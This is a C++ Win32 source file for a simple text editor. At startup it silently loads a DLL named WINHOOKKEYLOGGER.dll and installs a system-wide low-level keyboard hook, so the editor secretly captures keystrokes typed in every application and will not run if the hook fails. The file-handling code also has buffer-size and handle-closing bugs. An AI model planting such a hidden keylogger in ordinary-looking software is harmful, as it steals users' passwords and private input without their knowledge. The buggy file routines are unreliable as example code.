#include "framework.h"
#include "resource.h"

constexpr int MAX_LOADSTRING = 100;
constexpr unsigned BUFFERSIZE = 65555;
#define ID_EDITCHILD 100

// Global Variables:
HINSTANCE g_hInst;                                // current instance
HWND g_editorHWnd;
wchar_t g_szTitle[MAX_LOADSTRING];                  // The title bar text
wchar_t g_szWindowClass[MAX_LOADSTRING];            // the main window class name

// Forward declarations of functions included in this code module:
ATOM                SimpleEditorRegisterClass(HINSTANCE hInstance);
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);

BOOL PrepareFile(HWND ownerWindowsHwnd, HANDLE* hf, bool isForReading);
void OnSaveFile(HWND hwnd);
void OnOpenFile(HWND hwnd);
BOOL InitHooks();

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, g_szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_SIMPLEWINAPIEDITOR, g_szWindowClass, MAX_LOADSTRING);
    SimpleEditorRegisterClass(hInstance);

    // Perform application initialization:
    if (!InitInstance(hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_SIMPLEWINAPIEDITOR));

    MSG msg;

    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return static_cast<int>(msg.wParam);
}

ATOM SimpleEditorRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SIMPLEWINAPIEDITOR));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_SIMPLEWINAPIEDITOR);
    wcex.lpszClassName  = g_szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   g_hInst = hInstance;

   HWND hWnd = CreateWindowW(g_szWindowClass, g_szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!hWnd)
   {
      return FALSE;
   }

   g_editorHWnd = CreateWindowEx(
       0, L"EDIT",   // predefined class 
       NULL,         // no window title 
       WS_CHILD | WS_VISIBLE | WS_VSCROLL |
       ES_LEFT | ES_MULTILINE | ES_AUTOVSCROLL,
       0, 0, 0, 0,   // set size in WM_SIZE message 
       hWnd,         // parent window 
       (HMENU)ID_EDITCHILD,   // edit control ID 
       (HINSTANCE)GetWindowLongPtrW(hWnd, GWLP_HINSTANCE),
       NULL);        // pointer not needed 

   if (!g_editorHWnd)
   {
       return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   if (!InitHooks())
   {
       return FALSE;
   }

   return TRUE;
 }

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            switch (wmId)
            {
            case ID_FILE_OPEN:
                OnOpenFile(hWnd);
                break;
            case ID_FILE_SAVE:
                OnSaveFile(hWnd);
                break;
            case IDM_ABOUT:
                DialogBox(g_hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;

    case WM_SETFOCUS:
        SetFocus(g_editorHWnd);
        return 0;

    case WM_SIZE:
        MoveWindow(g_editorHWnd,
            0, 0,
            LOWORD(lParam),
            HIWORD(lParam),
            TRUE);
        return 0;

    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

BOOL PrepareFile(HWND ownerWindowsHwnd, HANDLE* hf, bool isForReading)
{
    OPENFILENAME ofn;       // common dialog box structure
    wchar_t szFile[MAX_PATH] = { 0 };       // buffer for file name

    // Initialize OPENFILENAME
    ZeroMemory(&ofn, sizeof(OPENFILENAME));
    ofn.lStructSize = sizeof(OPENFILENAME);
    ofn.hwndOwner = ownerWindowsHwnd;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile);
    ofn.lpstrFilter = L"All\0*.*\0";
    ofn.nFilterIndex = 1;
    ofn.lpstrFileTitle = NULL;
    ofn.nMaxFileTitle = 0;
    ofn.lpstrInitialDir = NULL;
    ofn.Flags = isForReading ? OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST
        : OFN_PATHMUSTEXIST | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;

    auto fnPtr = isForReading ? &GetOpenFileNameW : &GetSaveFileNameW;

    if (fnPtr(&ofn) != FALSE)
    {
        *hf = CreateFile(ofn.lpstrFile,
            isForReading ? GENERIC_READ : GENERIC_WRITE,
            0,
            (LPSECURITY_ATTRIBUTES)NULL,
            isForReading ? OPEN_EXISTING : CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            (HANDLE)NULL);
        if (*hf == INVALID_HANDLE_VALUE)
        {
            return FALSE;
        }
    }
    return TRUE;
}

void OnOpenFile(HWND hwnd)
{
    HANDLE hFile = INVALID_HANDLE_VALUE;
    if(PrepareFile(hwnd, &hFile, true))
    {
        DWORD dwBytesRead = 0;
        TCHAR ReadBuffer[BUFFERSIZE] = { 0 };
        OVERLAPPED ol = { 0 };
        if (FALSE != ReadFile(hFile, &ReadBuffer, BUFFERSIZE, &dwBytesRead, &ol))
        {
            SetWindowText(g_editorHWnd, ReadBuffer);
        }
    }
    CloseHandle(hFile);

}

void OnSaveFile(HWND hwnd)
{
    HANDLE hFile = INVALID_HANDLE_VALUE;
    if (PrepareFile(hwnd, &hFile, false))
    {

        wchar_t WriteBuffer[BUFFERSIZE] = { 0 };
        int textLen = GetWindowTextW(g_editorHWnd, WriteBuffer, BUFFERSIZE);

        DWORD BytesWritten = 0;
        OVERLAPPED ol = { 0 };
        if (FALSE == WriteFile(hFile, WriteBuffer, textLen * sizeof(wchar_t), &BytesWritten, &ol))
        {
            //TODO Log Error
        }
        CloseHandle(hFile);
    }
}

BOOL InitHooks()
{
    HOOKPROC hkprcKeyboard;
    static HINSTANCE hinstDLL;
    static HHOOK hhooKeyboard;

    hinstDLL = LoadLibraryW(L"WINHOOKKEYLOGGER.dll");
    hkprcKeyboard = (HOOKPROC)GetProcAddress(hinstDLL, "KeyBoardHookProc");
    if (!hkprcKeyboard)
    {
        return FALSE;
    }

    hhooKeyboard = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        hkprcKeyboard,
        hinstDLL,
        0);

    if (!hhooKeyboard)
    {
        return FALSE;
    }

    return TRUE;
}
